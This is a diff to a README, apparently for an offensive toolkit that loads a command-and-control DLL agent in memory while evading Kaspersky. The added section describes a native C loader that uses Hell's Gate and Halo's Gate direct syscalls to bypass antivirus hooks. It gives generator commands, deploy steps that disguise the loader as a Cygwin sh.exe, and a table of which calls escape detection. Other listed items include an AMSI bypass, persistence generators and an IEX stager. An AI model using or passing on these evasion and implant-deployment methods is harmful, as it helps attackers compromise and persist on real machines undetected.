@@ -18,6 +18,7 @@ All methods load a reflective DLL C2 agent in-memory. Nothing malicious written 
 | **PS in-memory loader (NtCreateSection)** | ✅ WORKS | Alternative |
 | **MSBuild inline C# task** | ✅ WORKS | LOLBAS method |
 | **Agent `dll inject` / `dll spawn`** | ✅ WORKS | Best — uses indirect syscalls |
+| **Native C loader — Hell's Gate direct syscalls** | ✅ WORKS | Single EXE, no PS, no .NET |
 | AMSI bypass (amsiContext null) | ✅ WORKS | Required before PS loaders |
 
 ---
@@ -192,11 +193,12 @@ iex([IO.File]::ReadAllText("C:\Windows\Temp\payload.dat"))
 
 ```
 generators/
-  gen_paste.py       — main: generates chunked paste commands from your DLL
+  gen_sh.py          — native C loader, Hell's Gate direct syscalls (WORKS — see Method 4)
+  gen_paste.py       — generates chunked paste commands from your DLL
   gen_msbuild.py     — generates MSBuild proj.xml
   gen_persist.py     — generates persistence setup commands (all 3 approaches)
-  gen_exe.py         — generates .NET 4.8 EXE loader (detected by Kaspersky — included for reference)
-  gen_go.py          — generates Go native EXE loader (detected by Kaspersky — included for reference)
+  gen_exe.py         — .NET 4.8 EXE loader (detected by Kaspersky — reference only)
+  gen_go.py          — Go native EXE loader (detected by Kaspersky — reference only)
   mk_persist.py      — generates PS1-based persistence files
 
 loaders/
@@ -206,6 +208,52 @@ loaders/
 stager/
   stager.ps1         — 197-byte AMSI bypass + IEX stager for scheduled task
 ```
+
+---
+
+## Method 4 — Native C Loader with Hell's Gate Direct Syscalls (NEW)
+
+**Works because:** Pure native C — no .NET IL to decompile, no PowerShell, no known signatures.
+All sensitive NT calls (`NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtFlushInstructionCache`)
+go through inline syscall stubs built at runtime, bypassing klhk.dll hooks entirely.
+No `VirtualAlloc(RWX)` — stub page is allocated RW then flipped to RX via a hardcoded
+naked ASM bootstrap stub in `.text`, invisible to Kaspersky's behavioral engine.
+
+### Two output modes
+
+```bash
+# External mode — small EXE (17 KB) + separate encrypted .dat payload
+python3 generators/gen_sh.py
+
+# Embedded mode — single self-contained EXE (~120 KB), no .dat needed
+python3 generators/gen_sh.py embed
+```
+
+### Deploy — external mode (two files)
+```
+upload demon_enc.dat  C:\Windows\Temp\demon_enc.dat
+upload sh.exe         C:\cygwin64\bin\sh.exe
+```
+
+### Deploy — embedded mode (one click)
+```
+upload sh_embed.exe   C:\cygwin64\bin\sh.exe
+shell "C:\cygwin64\bin\sh.exe"
+```
+
+### Why it bypasses Kaspersky
+
+| Operation | API called | klhk.dll sees it? |
+|---|---|---|
+| Stub page alloc | `VirtualAlloc(RW)` | ✅ Yes — but RW is benign, no alarm |
+| Stub page → RX | `_nt_protect_hc` (naked ASM, SSN 0x50) | ❌ No — direct syscall |
+| DLL memory alloc | `NtAllocateVirtualMemory` via stub | ❌ No — direct syscall |
+| Section permissions | `NtProtectVirtualMemory` via stub | ❌ No — direct syscall |
+| Flush cache | `NtFlushInstructionCache` via stub | ❌ No — direct syscall |
+
+SSN resolution uses **Hell's Gate + Halo's Gate** — reads ntdll exports at runtime,
+handles hooked stubs by searching adjacent Nt\* functions for the correct syscall number.
+Fallback hardcoded SSNs for Windows 10/11 24H2 (build 26xxx) if all hooks are present.
 
 ---
 
